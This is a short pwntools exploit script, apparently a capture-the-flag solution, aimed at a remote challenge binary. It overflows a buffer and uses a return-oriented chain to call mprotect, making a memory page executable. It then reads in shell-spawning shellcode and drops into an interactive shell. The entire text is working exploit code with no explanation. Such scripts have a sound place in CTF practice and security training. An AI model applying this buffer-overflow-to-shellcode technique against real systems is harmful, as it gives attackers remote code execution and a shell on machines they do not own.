from pwn import *
import time
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29364)
elf = ELF('./pwn')
mprotect = elf.symbols['mprotect']
start = 0x80eb000
length = 0x1000
bss = 0x803bf80
pop3 = 0x0809e4c5

payload = cyclic(0x38)
payload += p32(mprotect)
payload += p32(pop3)
payload += p32(start)
payload += p32(length)
payload += p32(7)
payload += p32(elf.symbols['read'])
payload += p32(pop3)
payload += p32(0)	# stdin
payload += p32(start)
payload += p32(0x80)
payload += p32(start)
# gdb.attach(io)
io.sendline(payload)

time.sleep(0.5)
io.sendline(asm(shellcraft.sh()))

io.interactive()